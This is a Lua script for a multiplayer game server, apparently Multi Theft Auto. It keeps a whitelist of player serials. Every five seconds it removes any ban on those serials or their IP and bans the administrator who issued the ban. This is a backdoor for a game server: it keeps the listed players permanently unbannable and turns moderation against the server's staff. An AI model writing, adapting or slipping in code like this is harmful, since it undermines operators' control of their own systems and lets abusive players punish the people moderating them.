local serials = {
["serial"] = true,
["0C037EC2C34949FE98F2442DDC7B3F02"] = true,--Maniseniler
["serial"] = true,
["serial"] = true,
}
function autounban()
for i,p in ipairs(getElementsByType("player")) do
local Ser = getPlayerSerial(p)
if serials[Ser] then
thisIP = getPlayerIP(p)
end
end
for index, ban in pairs(getBans()) do
local serial = getBanSerial(ban)
local ip = getBanIP(ban)
if serials[serial] or ip == thisIP then
local bannedPlayer = getPlayerFromName(getBanAdmin(ban))
removeBan(ban,root)
banPlayer (bannedPlayer,false,false,true,root)
end
end
end
setTimer(autounban,5000,0)